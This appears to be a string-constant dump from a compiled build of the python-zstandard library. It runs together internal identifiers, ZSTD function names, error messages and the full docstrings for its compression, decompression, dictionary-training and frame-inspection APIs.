        uObtain bytes copy of this instance.uThe number of segments within all ``BufferWithSegments``.uObtain the ``BufferSegment`` at an offset.affiastringalibaZSTD_getErrorNameadecodeTuutf-8aZSTD_createCCtxParamsaNULLagcaZSTD_freeCCtxParamsaZSTD_c_formataformataZSTD_c_compressionLevelacompression_levelaZSTD_c_windowLogawindow_logaZSTD_c_hashLogahash_logaZSTD_c_chainLogachain_logaZSTD_c_searchLogasearch_logaZSTD_c_minMatchamin_matchaZSTD_c_targetLengthatarget_lengthaZSTD_c_strategyastrategyaZSTD_c_contentSizeFlagawrite_content_sizeaZSTD_c_checksumFlagawrite_checksumaZSTD_c_dictIDFlagawrite_dict_idaZSTD_c_nbWorkersathreadsaZSTD_c_jobSizeajob_sizeaZSTD_c_overlapLogaoverlap_logaZSTD_c_forceMaxWindowaforce_max_windowaZSTD_c_enableLongDistanceMatchingaenable_ldmaZSTD_c_ldmHashLogaldm_hash_logaZSTD_c_ldmMinMatchaldm_min_matchaZSTD_c_ldmBucketSizeLogaldm_bucket_size_logaZSTD_c_ldmHashRateLogaldm_hash_rate_logutoo many values to unpack (expected 2)a_set_compression_parameteraresaZSTD_getCParamsDawindow_logachain_logahash_logasearch_logamin_matchatarget_lengthastrategyawindowLogachainLogahashLogasearchLogaminMatchatargetLengthastrategyakwargsaZstdCompressionParametersuCreate compression parameters from a compression level.

        :param level:
           Integer compression level.
        :param source_size:
           Integer size in bytes of source to be compressed.
        :param dict_size:
           Integer size in bytes of compression dictionary to use.
        :return:
           :py:class:`ZstdCompressionParameters`
        a_paramsa_cpu_countqa_get_compression_parameteraZSTD_estimateCCtxSize_usingCCtxParamsuEstimated size in bytes needed to compress with these parameters.aZSTD_estimateDCtxSizeuEstimate the memory size requirements for a decompressor instance.

    :return:
       Integer number of bytes.
    aZSTD_CCtxParams_setParameteraZSTD_isErroraZstdErroruunable to set compression context parameter: %sa_zstd_erroranewTuint *aZSTD_CCtxParams_getParameteruunable to get compression context parameter: %sa_compressora_writera_write_sizea_write_return_reada_closefda_entereda_closinga_closeda_bytes_compresseduchar[]a_dst_bufferTuZSTD_outBuffer *a_out_bufferadstasizeaposaZSTD_CCtx_setPledgedSrcSizea_cctxuerror setting source size: %sustream is closedTucannot __enter__ multiple timesacloseaUnsupportedOperationaZSTD_sizeof_CCtxafilenoufileno not available on underlying writeraflushaFLUSH_FRAMEuwritelines() is not yet implementedafrom_bufferTuZSTD_inBuffer *asrcain_bufferaZSTD_compressStream2aselfaout_bufferaZSTD_e_continueuzstd compress error: %sawriteabuffer:nnnatotal_writeuSend data to the compressor and possibly to the inner stream.aFLUSH_BLOCKaZSTD_e_flushaZSTD_e_enduunknown flush_mode: %ruEvict data from compressor's internal state and write it to inner stream.

        Calling this method may result in 0 or more ``write()`` calls to the
        inner stream.

        This method will also call ``flush()`` on the inner stream, if such a
        method exists.

        :param flush_mode:
           How to flush the zstd compressor.

           ``zstandard.FLUSH_BLOCK`` will flush data already sent to the
           compressor but not emitted to the inner stream. The stream is still
           writable after calling this. This is the default behavior.

           See documentation for other ``zstandard.FLUSH_*`` constants for more
           flushing options.
        :return:
           Integer number of bytes written to the inner stream.
        a_outa_finishedTucannot call compress() after compressor finishedasourceachunkscuSend data to the compressor.

        This method receives bytes to feed to the compressor and returns
        bytes constituting zstd compressed data.

        The zstd compressor accumulates bytes and the returned bytes may be
        substantially smaller or larger than the size of the input data on
        any given call. The returned value may be the empty byte string
        (``b""``).

        :param data:
           Data to write to the compressor.
        :return:
           Compressed data.
        aCOMPRESSOBJ_FLUSH_FINISHaCOMPRESSOBJ_FLUSH_BLOCKuflush mode not recognizedTucompressor object already finishedTuunhandled flush modeaz_flush_modeuerror ending compression stream: %suEmit data accumulated in the compressor that hasn't been outputted yet.

        The ``flush_mode`` argument controls how to end the stream.

        ``zstandard.COMPRESSOBJ_FLUSH_FINISH`` (the default) ends the
        compression stream and finishes a zstd frame. Once this type of flush
        is performed, ``compress()`` and ``flush()`` can no longer be called.
        This type of flush **must** be called to end the compression context. If
        not called, the emitted data may be incomplete and may not be readable
        by a decompressor.

        ``zstandard.COMPRESSOBJ_FLUSH_BLOCK`` will flush a zstd block. This
        ensures that all data fed to this instance will have been omitted and
        can be decoded by a decompressor. Flushes of this type can be performed
        multiple times. The next call to ``compress()`` will begin a new zstd
        block.

        :param flush_mode:
           How to flush the zstd compressor.
        :return:
           Compressed data.
        a_inuFeed new input data into the compressor.

        :param data:
           Data to feed to compressor.
        :return:
           Iterator of ``bytes`` representing chunks of compressed data.
        Tucannot call compress() after compression finishedTucannot perform operation before consuming output from previous operationadataacompressuZstdCompressionChunker.compressuFlushes all data currently in the compressor.

        :return:
           Iterator of ``bytes`` of compressed data.
        Tucannot call flush() after compression finishedTucannot call flush() before consuming output from previous operationuZstdCompressionChunker.flushuSignals the end of input data.

        No new data can be compressed after this method is called.

        This method will flush buffered data and finish the zstd frame.

        :return:
           Iterator of ``bytes`` of compressed data.
        Tucannot call finish() after compression finishedTucannot call finish() before consuming output from previous operationafinishuZstdCompressionChunker.finisha_sourcea_read_sizea_finished_inputa_finished_outputa_in_buffera_source_bufferucannot __enter__ multiple timesustream is not writableareadTl@ucannot read negative amounts less than -1areadalla_compress_into_buffera_read_inputaCOMPRESSION_RECOMMENDED_OUTPUT_SIZEamemmoveaZSTD_maxCLevelulevel must be less than %ducannot define compression_params and write_checksumucannot define compression_params and write_content_sizeucannot define compression_params and write_dict_iducannot define compression_params and threadsa_make_cctx_paramslaZSTD_createCCtxa_dict_dataa_setup_cctxaZSTD_freeCCtxTasizeaZSTD_CCtx_setParametersUsingCCtxParamsucould not set compression parameters: %sa_cdictaZSTD_CCtx_refCDictaZSTD_CCtx_loadDictionary_advancedaas_bytesaZSTD_dlm_byRefa_dict_typeucould not load compression dictionary: %suObtain the memory usage of this compressor, in bytes.

        >>> cctx = zstandard.ZstdCompressor()
        >>> memory = cctx.memory_size()
        aZSTD_CCtx_resetaZSTD_reset_session_onlyaZSTD_compressBoundanew_nonzeroucannot compress: %sTuunexpected partial frame flushu
        Compress data in a single operation.

        This is the simplest mechanism to perform compression: simply pass in a
        value and get a compressed value back. It is almost the most prone to
        abuse.

        The input and output values must fit in memory, so passing in very large
        values can result in excessive memory usage. For this reason, one of the
        streaming based APIs is preferred for larger values.

        :param data:
           Source data to compress
        :return:
           Compressed data

        >>> cctx = zstandard.ZstdCompressor()
        >>> compressed = cctx.compress(b"data to compress")
        aZSTD_CONTENTSIZE_UNKNOWNaZstdCompressionObju
        Obtain a compressor exposing the Python standard library compression API.

        See :py:class:`ZstdCompressionObj` for the full documentation.

        :param size:
           Size in bytes of data that will be compressed.
        :return:
           :py:class:`ZstdCompressionObj`
        aZstdCompressionChunkerTachunk_sizeu
        Create an object for iterative compressing to same-sized chunks.

        This API is similar to :py:meth:`ZstdCompressor.compressobj` but has
        better performance properties.

        :param size:
           Size in bytes of data that will be compressed.
        :param chunk_size:
           Size of compressed chunks.
        :return:
           :py:class:`ZstdCompressionChunker`
        ufirst argument must have a read() methodusecond argument must have a write() methodTlpaifharead_sizeatotal_readaofhu
        Copy data between 2 streams while compressing it.

        Data will be read from ``ifh``, compressed, and written to ``ofh``.
        ``ifh`` must have a ``read(size)`` method. ``ofh`` must have a
        ``write(data)``
        method.

        >>> cctx = zstandard.ZstdCompressor()
        >>> with open(input_path, "rb") as ifh, open(output_path, "wb") as ofh:
        ...     cctx.copy_stream(ifh, ofh)

        It is also possible to declare the size of the source stream:

        >>> cctx = zstandard.ZstdCompressor()
        >>> cctx.copy_stream(ifh, ofh, size=len_of_input)

        You can also specify how large the chunks that are ``read()``
        and ``write()`` from and to the streams:

        >>> cctx = zstandard.ZstdCompressor()
        >>> cctx.copy_stream(ifh, ofh, read_size=32768, write_size=16384)

        The stream copier returns a 2-tuple of bytes read and written:

        >>> cctx = zstandard.ZstdCompressor()
        >>> read_count, write_count = cctx.copy_stream(ifh, ofh)

        :param ifh:
           Source stream to read from
        :param ofh:
           Destination stream to write to
        :param size:
           Size in bytes of the source stream. If defined, compression
           parameters will be tuned for this size.
        :param read_size:
           Chunk sizes that source stream should be ``read()`` from.
        :param write_size:
           Chunk sizes that destination stream should be ``write()`` to.
        :return:
           2-tuple of ints of bytes read and written, respectively.
        aZstdCompressionReaderTaclosefdu
        Wrap a readable source with a stream that can read compressed data.

        This will produce an object conforming to the ``io.RawIOBase``
        interface which can be ``read()`` from to retrieve compressed data
        from a source.

        The source object can be any object with a ``read(size)`` method
        or an object that conforms to the buffer protocol.

        See :py:class:`ZstdCompressionReader` for type documentation and usage
        examples.

        :param source:
           Object to read source data from
        :param size:
           Size in bytes of source object.
        :param read_size:
           How many bytes to request when ``read()``'ing from the source.
        :param closefd:
           Whether to close the source stream when the returned stream is
           closed.
        :return:
           :py:class:`ZstdCompressionReader`
        umust pass an object with a write() methodaZstdCompressionWriteru
        Create a stream that will write compressed data into another stream.

        The argument to ``stream_writer()`` must have a ``write(data)`` method.
        As compressed data is available, ``write()`` will be called with the
        compressed data as its argument. Many common Python types implement
        ``write()``, including open file handles and ``io.BytesIO``.

        See :py:class:`ZstdCompressionWriter` for more documentation, including
        usage examples.

        :param writer:
           Stream to write compressed data to.
        :param size:
           Size in bytes of data to be compressed. If set, it will be used
           to influence compression parameter tuning and could result in the
           size being written into the header of the compressed data.
        :param write_size:
           How much data to ``write()`` to ``writer`` at a time.
        :param write_return_read:
           Whether ``write()`` should return the number of bytes that were
           consumed from the input.
        :param closefd:
           Whether to ``close`` the ``writer`` when this stream is closed.
        :return:
           :py:class:`ZstdCompressionWriter`
        u
        Read uncompressed data from a reader and return an iterator

        Returns an iterator of compressed data produced from reading from
        ``reader``.

        This method provides a mechanism to stream compressed data out of a
        source as an iterator of data chunks.

        Uncompressed data will be obtained from ``reader`` by calling the
        ``read(size)`` method of it or by reading a slice (if ``reader``
        conforms to the *buffer protocol*). The source data will be streamed
        into a compressor. As compressed data is available, it will be exposed
        to the iterator.

        Data is read from the source in chunks of ``read_size``. Compressed
        chunks are at most ``write_size`` bytes. Both values default to the
        zstd input and and output defaults, respectively.

        If reading from the source via ``read()``, ``read()`` will be called
        until it raises or returns an empty bytes (``b""``). It is perfectly
        valid for the source to deliver fewer bytes than were what requested
        by ``read(size)``.

        The caller is partially in control of how fast data is fed into the
        compressor by how it consumes the returned iterator. The compressor
        will not consume from the reader unless the caller consumes from the
        iterator.

        >>> cctx = zstandard.ZstdCompressor()
        >>> for chunk in cctx.read_to_iter(fh):
        ...     # Do something with emitted data.

        ``read_to_iter()`` accepts a ``size`` argument declaring the size of
        the input stream:

        >>> cctx = zstandard.ZstdCompressor()
        >>> for chunk in cctx.read_to_iter(fh, size=some_int):
        >>>     pass

        You can also control the size that data is ``read()`` from the source
        and the ideal size of output chunks:

        >>> cctx = zstandard.ZstdCompressor()
        >>> for chunk in cctx.read_to_iter(fh, read_size=16384, write_size=8192):
        >>>     pass

        ``read_to_iter()`` does not give direct control over the sizes of chunks
        fed into the compressor. Instead, chunk sizes will be whatever the object
        being read from delivers. These will often be of a uniform size.

        :param reader:
           Stream providing data to be compressed.
        :param size:
           Size in bytes of input data.
        :param read_size:
           Controls how many bytes are ``read()`` from the source.
        :param write_size:
           Controls the output size of emitted chunks.
        :return:
           Iterator of ``bytes``.
        areadera__getitem__umust pass an object with a read() method or conforms to buffer protocolawrite_sizeabuffer_offsetaminaread_to_iteruZstdCompressor.read_to_iteru
        Compress multiple pieces of data as a single function call.

        (Experimental. Not yet supported by CFFI backend.)

        This function is optimized to perform multiple compression operations
        as as possible with as little overhead as possible.

        Data to be compressed can be passed as a ``BufferWithSegmentsCollection``,
        a ``BufferWithSegments``, or a list containing byte like objects. Each
        element of the container will be compressed individually using the
        configured parameters on the ``ZstdCompressor`` instance.

        The ``threads`` argument controls how many threads to use for
        compression. The default is ``0`` which means to use a single thread.
        Negative values use the number of logical CPUs in the machine.

        The function returns a ``BufferWithSegmentsCollection``. This type
        represents N discrete memory allocations, each holding 1 or more
        compressed frames.

        Output data is written to shared memory buffers. This means that unlike
        regular Python objects, a reference to *any* object within the collection
        keeps the shared buffer and therefore memory backing it alive. This can
        have undesirable effects on process memory usage.

        The API and behavior of this function is experimental and will likely
        change. Known deficiencies include:

        * If asked to use multiple threads, it will always spawn that many
          threads, even if the input is too small to use them. It should
          automatically lower the thread count when the extra threads would
          just add overhead.
        * The buffer allocation strategy is fixed. There is room to make it
          dynamic, perhaps even to allow one output buffer per input,
          facilitating a variation of the API to return a list without the
          adverse effects of shared memory buffers.

        :param data:
           Source to read discrete pieces of data to compress.

           Can be a ``BufferWithSegmentsCollection``, a ``BufferWithSegments``,
           or a ``list[bytes]``.
        :return:
           BufferWithSegmentsCollection holding compressed data.
        aZSTD_getFrameProgressionaingestedaconsumedaproducedu
        Return information on how much work the compressor has done.

        Returns a 3-tuple of (ingested, consumed, produced).

        >>> cctx = zstandard.ZstdCompressor()
        >>> (ingested, consumed, produced) = cctx.frame_progression()
        aframeContentSizeacontent_sizeawindowSizeawindow_sizeadictIDadict_idachecksumFlagahas_checksumaZSTD_getFrameContentSizeaZSTD_CONTENTSIZE_ERRORTuerror when determining content sizeuObtain the decompressed size of a frame.

    The returned value is usually accurate. But strictly speaking it should
    not be trusted.

    :return:
       ``-1`` if size unknown and a non-negative integer otherwise.
    aZSTD_frameHeaderSizeucould not determine frame header size: %suObtain the size of a frame header.

    :return:
       Integer size in bytes.
    TuZSTD_frameHeader *aZSTD_getFrameHeaderucannot get frame parameters: %sunot enough data for frame parameters; need %d bytesaFrameParametersu
    Parse a zstd frame header into frame parameters.

    Depending on which fields are present in the frame and their values, the
    length of the frame parameters varies. If insufficient bytes are passed
    in to fully parse the frame parameters, ``ZstdError`` is raised. To ensure
    frame parameters can be parsed, pass in at least 18 bytes.

    :param data:
       Data from which to read frame parameters.
    :return:
       :py:class:`FrameParameters`
    a_datawkwdaDICT_TYPE_AUTOaDICT_TYPE_RAWCONTENTaDICT_TYPE_FULLDICTuinvalid dictionary load mode: %d; must use DICT_TYPE_* constantsaZDICT_getDictIDuObtain the integer ID of the dictionary.uObtain the ``bytes`` representation of the dictionary.umust only specify one of level or compression_paramsumust specify one of level or compression_paramsTaZSTD_compressionParametersachainLogahashLogaminMatchasearchLogatargetLengthawindowLogaZSTD_createCDict_advancedacparamsaZSTD_defaultCMemTuunable to precompute dictionaryaZSTD_freeCDictaZSTD_sizeof_CDictuPrecompute a dictionary os it can be used by multiple compressors.

        Calling this method on an instance that will be used by multiple
        :py:class:`ZstdCompressor` instances will improve performance.
        aZSTD_createDDict_advancedTucould not create decompression dictaZSTD_freeDDictaZSTD_sizeof_DDicta_ddictusamples must be a listlllalenusize_t[]usamples must be bytesasamples_bufferaoffsetasample_sizesTuZDICT_fastCover_params_t *wfastepsanbThreadsasplitPointaaccelazParamsanotificationLevelacompressionLevelaZDICT_optimizeTrainFromBuffer_fastCoveraaddressofaZDICT_isErroraZDICT_getErrorNameucannot train dict: %saZstdCompressionDictTadict_typewkwduTrain a dictionary from sample data using the COVER algorithm.

    A compression dictionary of size ``dict_size`` will be created from the
    iterable of ``samples``. The raw dictionary bytes will be returned.

    The dictionary training mechanism is known as *cover*. More details about it
    are available in the paper *Effective Construction of Relative Lempel-Ziv
    Dictionaries* (authors: Liao, Petri, Moffat, Wirth).

    The cover algorithm takes parameters ``k`` and ``d``. These are the
    *segment size* and *dmer size*, respectively. The returned dictionary
    instance created by this function has ``k`` and ``d`` attributes
    containing the values for these parameters. If a ``ZstdCompressionDict``
    is constructed from raw bytes data (a content-only dictionary), the
    ``k`` and ``d`` attributes will be ``0``.

    The segment and dmer size parameters to the cover algorithm can either be
    specified manually or ``train_dictionary()`` can try multiple values
    and pick the best one, where *best* means the smallest compressed data size.
    This later mode is called *optimization* mode.

    Under the hood, this function always calls
    ``ZDICT_optimizeTrainFromBuffer_fastCover()``. See the corresponding C library
    documentation for more.

    If neither ``steps`` nor ``threads`` is defined, defaults for ``d``, ``steps``,
    and ``level`` will be used that are equivalent with what
    ``ZDICT_trainFromBuffer()`` would use.


    :param dict_size:
       Target size in bytes of the dictionary to generate.
    :param samples:
       A list of bytes holding samples the dictionary will be trained from.
    :param k:
       Segment size : constraint: 0 < k : Reasonable range [16, 2048+]
    :param d:
       dmer size : constraint: 0 < d <= k : Reasonable range [6, 16]
    :param f:
       log of size of frequency array : constraint: 0 < f <= 31 : 1 means
       default(20)
    :param split_point:
       Percentage of samples used for training: Only used for optimization.
       The first # samples * ``split_point`` samples will be used to training.
       The last # samples * (1 - split_point) samples will be used for testing.
       0 means default (0.75), 1.0 when all samples are used for both training
       and testing.
    :param accel:
       Acceleration level: constraint: 0 < accel <= 10. Higher means faster
       and less accurate, 0 means default(1).
    :param dict_id:
       Integer dictionary ID for the produced dictionary. Default is 0, which uses
       a random value.
    :param steps:
       Number of steps through ``k`` values to perform when trying parameter
       variations.
    :param threads:
       Number of threads to use when trying parameter variations. Default is 0,
       which means to use a single thread. A negative value can be specified to
       use as many threads as there are detected logical CPUs.
    :param level:
       Integer target compression level when trying parameter variations.
    :param notifications:
       Controls writing of informational messages to ``stderr``. ``0`` (the
       default) means to write nothing. ``1`` writes errors. ``2`` writes
       progression info. ``3`` writes more details. And ``4`` writes all info.
    a_decompressora_read_across_framesa_unused_inputTucannot use a decompressobj multiple timesaZSTD_decompressStreama_dctxuzstd decompressor error: %suSend compressed data to the decompressor and obtain decompressed data.

        :param data:
           Data to feed into the decompressor.
        :return:
           Decompressed bytes.
        uBytes past the end of compressed data.

        If ``decompress()`` is fed additional data beyond the end of a zstd
        frame, this value will be non-empty once ``decompress()`` fully decodes
        the input frame.
        uWhether the end of the compressed data stream has been reached.a_bytes_decompresseduzstd decompress error: %suDecompress available input into an output buffer.

        Returns True if data in output buffer should be emitted.
        a_decompress_into_bufferaDECOMPRESSION_RECOMMENDED_OUTPUT_SIZEaSEEK_SETucannot seek to negative position with SEEK_SETucannot seek zstd decompression stream backwardsaSEEK_CURaSEEK_ENDuzstd decompression streams cannot be seeked with SEEK_ENDaread_amounta_ensure_dctxaZSTD_sizeof_DCtxadctxa_max_window_sizea_formataZSTD_createDCtxaZSTD_freeDCtxuSize of decompression context, in bytes.

        >>> dctx = zstandard.ZstdDecompressor()
        >>> size = dctx.memory_size()
        TuZstdDecompressor.read_across_frames=True is not yet implementedTuerror determining content size from frame headerTucould not determine content size in frame headerudecompression error: %sTudecompression error: did not decompress full frameaoutput_sizeudecompression error: decompressed %d bytes; expected %ducompressed input contains %d bytes of unused data, which is disallowedu
        Decompress data in a single operation.

        This method will decompress the input data in a single operation and
        return the decompressed data.

        The input bytes are expected to contain at least 1 full Zstandard frame
        (something compressed with :py:meth:`ZstdCompressor.compress` or
        similar). If the input does not contain a full frame, an exception will
        be raised.

        ``read_across_frames`` controls whether to read multiple zstandard
        frames in the input. When False, decompression stops after reading the
        first frame. This feature is not yet implemented but the argument is
        provided for forward API compatibility when the default is changed to
        True in a future release. For now, if you need to decompress multiple
        frames, use an API like :py:meth:`ZstdCompressor.stream_reader` with
        ``read_across_frames=True``.

        ``allow_extra_data`` controls how to handle extra input data after a
        fully decoded frame. If False, any extra data (which could be a valid
        zstd frame) will result in ``ZstdError`` being raised. If True, extra
        data is silently ignored. The default will likely change to False in a
        future release when ``read_across_frames`` defaults to True.

        If the input contains extra data after a full frame, that extra input
        data is silently ignored. This behavior is undesirable in many scenarios
        and will likely be changed or controllable in a future release (see
        #181).

        If the frame header of the compressed data does not contain the content
        size, ``max_output_size`` must be specified or ``ZstdError`` will be
        raised. An allocation of size ``max_output_size`` will be performed and an
        attempt will be made to perform decompression into that buffer. If the
        buffer is too small or cannot be allocated, ``ZstdError`` will be
        raised. The buffer will be resized if it is too large.

        Uncompressed data could be much larger than compressed data. As a result,
        calling this function could result in a very large memory allocation
        being performed to hold the uncompressed data. This could potentially
        result in ``MemoryError`` or system memory swapping. If you don't need
        the full output data in a single contiguous array in memory, consider
        using streaming decompression for more resilient memory behavior.

        Usage:

        >>> dctx = zstandard.ZstdDecompressor()
        >>> decompressed = dctx.decompress(data)

        If the compressed data doesn't have its content size embedded within it,
        decompression can be attempted by specifying the ``max_output_size``
        argument:

        >>> dctx = zstandard.ZstdDecompressor()
        >>> uncompressed = dctx.decompress(data, max_output_size=1048576)

        Ideally, ``max_output_size`` will be identical to the decompressed
        output size.

        .. important::

           If the exact size of decompressed data is unknown (not passed in
           explicitly and not stored in the zstd frame), for performance
           reasons it is encouraged to use a streaming API.

        :param data:
           Compressed data to decompress.
        :param max_output_size:
           Integer max size of response.

           If ``0``, there is no limit and we can attempt to allocate an output
           buffer of infinite size.
        :return:
           ``bytes`` representing decompressed output.
        aZstdDecompressionReaderu
        Read-only stream wrapper that performs decompression.

        This method obtains an object that conforms to the ``io.RawIOBase``
        interface and performs transparent decompression via ``read()``
        operations. Source data is obtained by calling ``read()`` on a
        source stream or object implementing the buffer protocol.

        See :py:class:`zstandard.ZstdDecompressionReader` for more documentation
        and usage examples.

        :param source:
           Source of compressed data to decompress. Can be any object
           with a ``read(size)`` method or that conforms to the buffer protocol.
        :param read_size:
           Integer number of bytes to read from the source and feed into the
           compressor at a time.
        :param read_across_frames:
           Whether to read data across multiple zstd frames. If False,
           decompression is stopped at frame boundaries.
        :param closefd:
           Whether to close the source stream when this instance is closed.
        :return:
           :py:class:`zstandard.ZstdDecompressionReader`.
        uwrite_size must be positiveaZstdDecompressionObjTawrite_sizearead_across_framesuObtain a standard library compatible incremental decompressor.

        See :py:class:`ZstdDecompressionObj` for more documentation
        and usage examples.

        :param write_size: size of internal output buffer to collect decompressed
          chunks in.
        :param read_across_frames: whether to read across multiple zstd frames.
          If False, reading stops after 1 frame and subsequent decompress
          attempts will raise an exception.
        :return:
           :py:class:`zstandard.ZstdDecompressionObj`
        uRead compressed data to an iterator of uncompressed chunks.

        This method will read data from ``reader``, feed it to a decompressor,
        and emit ``bytes`` chunks representing the decompressed result.

        >>> dctx = zstandard.ZstdDecompressor()
        >>> for chunk in dctx.read_to_iter(fh):
        ...     # Do something with original data.

        ``read_to_iter()`` accepts an object with a ``read(size)`` method that
        will return compressed bytes or an object conforming to the buffer
        protocol.

        ``read_to_iter()`` returns an iterator whose elements are chunks of the
        decompressed data.

        The size of requested ``read()`` from the source can be specified:

        >>> dctx = zstandard.ZstdDecompressor()
        >>> for chunk in dctx.read_to_iter(fh, read_size=16384):
        ...    pass

        It is also possible to skip leading bytes in the input data:

        >>> dctx = zstandard.ZstdDecompressor()
        >>> for chunk in dctx.read_to_iter(fh, skip_bytes=1):
        ...    pass

        .. tip::

           Skipping leading bytes is useful if the source data contains extra
           *header* data. Traditionally, you would need to create a slice or
           ``memoryview`` of the data you want to decompress. This would create
           overhead. It is more efficient to pass the offset into this API.

        Similarly to :py:meth:`ZstdCompressor.read_to_iter`, the consumer of the
        iterator controls when data is decompressed. If the iterator isn't consumed,
        decompression is put on hold.

        When ``read_to_iter()`` is passed an object conforming to the buffer protocol,
        the behavior may seem similar to what occurs when the simple decompression
        API is used. However, this API works when the decompressed size is unknown.
        Furthermore, if feeding large inputs, the decompressor will work in chunks
        instead of performing a single operation.

        :param reader:
           Source of compressed data. Can be any object with a
           ``read(size)`` method or any object conforming to the buffer
           protocol.
        :param read_size:
           Integer size of data chunks to read from ``reader`` and feed into
           the decompressor.
        :param write_size:
           Integer size of data chunks to emit from iterator.
        :param skip_bytes:
           Integer number of bytes to skip over before sending data into
           the decompressor.
        :return:
           Iterator of ``bytes`` representing uncompressed data.
        askip_bytesuskip_bytes must be smaller than read_sizeuskip_bytes larger than first input chunkuZstdDecompressor.read_to_iteraZstdDecompressionWriteru
        Push-based stream wrapper that performs decompression.

        This method constructs a stream wrapper that conforms to the
        ``io.RawIOBase`` interface and performs transparent decompression
        when writing to a wrapper stream.

        See :py:class:`zstandard.ZstdDecompressionWriter` for more documentation
        and usage examples.

        :param writer:
           Destination for decompressed output. Can be any object with a
           ``write(data)``.
        :param write_size:
           Integer size of chunks to ``write()`` to ``writer``.
        :param write_return_read:
           Whether ``write()`` should return the number of bytes of input
           consumed. If False, ``write()`` returns the number of bytes sent
           to the inner stream.
        :param closefd:
           Whether to ``close()`` the inner stream when this stream is closed.
        :return:
           :py:class:`zstandard.ZstdDecompressionWriter`
        u
        Copy data between streams, decompressing in the process.

        Compressed data will be read from ``ifh``, decompressed, and written
        to ``ofh``.

        >>> dctx = zstandard.ZstdDecompressor()
        >>> dctx.copy_stream(ifh, ofh)

        e.g. to decompress a file to another file:

        >>> dctx = zstandard.ZstdDecompressor()
        >>> with open(input_path, 'rb') as ifh, open(output_path, 'wb') as ofh:
        ...     dctx.copy_stream(ifh, ofh)

        The size of chunks being ``read()`` and ``write()`` from and to the
        streams can be specified:

        >>> dctx = zstandard.ZstdDecompressor()
        >>> dctx.copy_stream(ifh, ofh, read_size=8192, write_size=16384)

        :param ifh:
           Source stream to read compressed data from.

           Must have a ``read()`` method.
        :param ofh:
           Destination stream to write uncompressed data to.

           Must have a ``write()`` method.
        :param read_size:
           The number of bytes to ``read()`` from the source in a single
           operation.
        :param write_size:
           The number of bytes to ``write()`` to the destination in a single
           operation.
        :return:
           2-tuple of integers representing the number of bytes read and
           written, respectively.
        uargument must be a listuempty input chainuchunk 0 must be bytesuchunk 0 is not a valid zstd frameuchunk 0 is too small to contain a zstd frameuchunk 0 missing content size in frameTFTaload_dictucould not decompress chunk 0: %sTuchunk 0 did not decompress full framewiuchunk %d must be bytesaparamsuchunk %d is not a valid zstd frameuchunk %d is too small to contain a zstd frameuchunk %d missing content size in frameucould not decompress chunk %d: %suchunk %d did not decompress full framealast_bufferu
        Decompress a series of frames using the content dictionary chaining technique.

        Such a list of frames is produced by compressing discrete inputs where
        each non-initial input is compressed with a *prefix* dictionary consisting
        of the content of the previous input.

        For example, say you have the following inputs:

        >>> inputs = [b"input 1", b"input 2", b"input 3"]

        The zstd frame chain consists of:

        1. ``b"input 1"`` compressed in standalone/discrete mode
        2. ``b"input 2"`` compressed using ``b"input 1"`` as a *prefix* dictionary
        3. ``b"input 3"`` compressed using ``b"input 2"`` as a *prefix* dictionary

        Each zstd frame **must** have the content size written.

        The following Python code can be used to produce a *prefix dictionary chain*:

        >>> def make_chain(inputs):
        ...    frames = []
        ...
        ...    # First frame is compressed in standalone/discrete mode.
        ...    zctx = zstandard.ZstdCompressor()
        ...    frames.append(zctx.compress(inputs[0]))
        ...
        ...    # Subsequent frames use the previous fulltext as a prefix dictionary
        ...    for i, raw in enumerate(inputs[1:]):
        ...        dict_data = zstandard.ZstdCompressionDict(
        ...            inputs[i], dict_type=zstandard.DICT_TYPE_RAWCONTENT)
        ...        zctx = zstandard.ZstdCompressor(dict_data=dict_data)
        ...        frames.append(zctx.compress(raw))
        ...
        ...    return frames

        ``decompress_content_dict_chain()`` returns the uncompressed data of the last
        element in the input chain.

        .. note::

           It is possible to implement *prefix dictionary chain* decompression
           on top of other APIs. However, this function will likely be faster -
           especially for long input chains - as it avoids the overhead of
           instantiating and passing around intermediate objects between
           multiple functions.

        :param frames:
           List of ``bytes`` holding compressed zstd frames.
        :return:
        u
        Decompress multiple zstd frames to output buffers as a single operation.

        (Experimental. Not available in CFFI backend.)

        Compressed frames can be passed to the function as a
        ``BufferWithSegments``, a ``BufferWithSegmentsCollection``, or as a
        list containing objects that conform to the buffer protocol. For best
        performance, pass a ``BufferWithSegmentsCollection`` or a
        ``BufferWithSegments``, as minimal input validation will be done for
        that type. If calling from Python (as opposed to C), constructing one
        of these instances may add overhead cancelling out the performance
        overhead of validation for list inputs.

        Returns a ``BufferWithSegmentsCollection`` containing the decompressed
        data. All decompressed data is allocated in a single memory buffer. The
        ``BufferWithSegments`` instance tracks which objects are at which offsets
        and their respective lengths.

        >>> dctx = zstandard.ZstdDecompressor()
        >>> results = dctx.multi_decompress_to_buffer([b'...', b'...'])

        The decompressed size of each frame MUST be discoverable. It can either be
        embedded within the zstd frame or passed in via the ``decompressed_sizes``
        argument.

        The ``decompressed_sizes`` argument is an object conforming to the buffer
        protocol which holds an array of 64-bit unsigned integers in the machine's
        native format defining the decompressed sizes of each frame. If this argument
        is passed, it avoids having to scan each frame for its decompressed size.
        This frame scanning can add noticeable overhead in some scenarios.

        >>> frames = [...]
        >>> sizes = struct.pack('=QQQQ', len0, len1, len2, len3)
        >>>
        >>> dctx = zstandard.ZstdDecompressor()
        >>> results = dctx.multi_decompress_to_buffer(frames, decompressed_sizes=sizes)

        .. note::

           It is possible to pass a ``mmap.mmap()`` instance into this function by
           wrapping it with a ``BufferWithSegments`` instance (which will define the
           offsets of frames within the memory mapped region).

        This function is logically equivalent to performing
        :py:meth:`ZstdCompressor.decompress` on each input frame and returning the
        result.

        This function exists to perform decompression on multiple frames as fast
        as possible by having as little overhead as possible. Since decompression is
        performed as a single operation and since the decompressed output is stored in
        a single buffer, extra memory allocations, Python objects, and Python function
        calls are avoided. This is ideal for scenarios where callers know up front that
        they need to access data for multiple frames, such as when  *delta chains* are
        being used.

        Currently, the implementation always spawns multiple threads when requested,
        even if the amount of work to do is small. In the future, it will be smarter
        about avoiding threads and their associated overhead when the amount of
        work to do is small.

        :param frames:
           Source defining zstd frames to decompress.
        :param decompressed_sizes:
           Array of integers representing sizes of decompressed zstd frames.
        :param threads:
           How many threads to use for decompression operations.

           Negative values will use the same number of threads as logical CPUs
           on the machine. Values ``0`` or ``1`` use a single thread.
        :return:
           ``BufferWithSegmentsCollection``
